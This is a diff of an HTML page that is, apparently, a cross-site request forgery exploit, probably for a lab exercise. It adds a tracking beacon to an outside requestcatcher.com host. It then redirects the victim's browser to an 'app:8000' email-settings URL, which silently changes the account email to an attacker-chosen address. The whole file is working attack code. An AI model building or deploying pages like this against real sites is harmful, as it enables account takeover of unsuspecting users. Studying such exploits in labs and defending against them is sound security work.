@@ -2,12 +2,19 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting</title>
+    <title>Navigation</title>
 </head>
 <body>
 <script>
+    const receiver =
+      "https://tpas-csrf-carlos1261.requestcatcher.com";
+
+    // Identifica exactamente esta versión.
+    new Image().src = receiver + "/?stage=app8000-v2";
+
+    // Navegación principal GET, sin temporizador.
     window.location.replace(
-        "http://app:8000/settings/email?new=prueba%40example.com"
+      "http://app:8000/settings/email?new=prueba%40example.com"
     );
 </script>
 </body>
